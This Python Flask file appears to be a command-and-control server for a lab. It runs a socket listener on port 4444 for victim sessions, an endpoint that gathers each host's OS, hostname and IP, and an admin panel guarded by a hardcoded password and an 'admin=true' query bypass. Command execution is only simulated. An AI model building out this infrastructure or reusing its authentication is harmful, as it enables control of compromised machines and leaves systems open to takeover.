from flask import Flask, render_template, request, jsonify, redirect, url_for
from database import Database
import socket
import threading
import time

app = Flask(__name__)
db = Database('data.db')

# Command server running in separate thread
class CommandServer(threading.Thread):
    def __init__(self, port=4444):
        threading.Thread.__init__(self)
        self.port = port
        self.clients = {}
        self.running = True
        
    def run(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', self.port))
            s.listen(5)
            print(f"[*] Command server listening on port {self.port}")
            
            while self.running:
                conn, addr = s.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(conn, addr)
                )
                client_thread.start()
    
    def handle_client(self, conn, addr):
        try:
            session_id = conn.recv(1024).decode()
            self.clients[session_id] = conn
            print(f"[*] New connection from {addr[0]} - Session ID: {session_id}")
            
            while True:
                command = conn.recv(1024).decode()
                if not command or command.lower() in ["exit", "quit"]:
                    break
                
                # Log command to database
                db.log_command(session_id, command)
                
                # Execute command (simulated in this educational version)
                response = f"Executed: {command}\n(Simulated in educational version)"
                conn.sendall(response.encode())
                
        finally:
            conn.close()
            if session_id in self.clients:
                del self.clients[session_id]

# Web routes
@app.route('/')
def home():
    if not request.args.get('admin'):
        return redirect(url_for('login'))
    return render_template('admin.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Simple authentication for educational purposes
        if request.form.get('password') == 'labpassword':
            return redirect(url_for('home', admin='true'))
    return render_template('login.html')

@app.route('/api/data', methods=['POST'])
def receive_data():
    data = request.json
    db.insert_data(
        data['session_id'],
        data['os'],
        data['hostname'],
        data['ip'],
        json.dumps(data)
    )
    return jsonify({"status": "success"})

@app.route('/api/clients')
def get_clients():
    return jsonify(db.get_all_clients())

@app.route('/api/commands/<session_id>')
def get_commands(session_id):
    return jsonify(db.get_commands(session_id))

if __name__ == '__main__':
    # Start command server in background
    cmd_server = CommandServer()
    cmd_server.daemon = True
    cmd_server.start()
    
    # Start web interface
    app.run(host='0.0.0.0', port=8000)
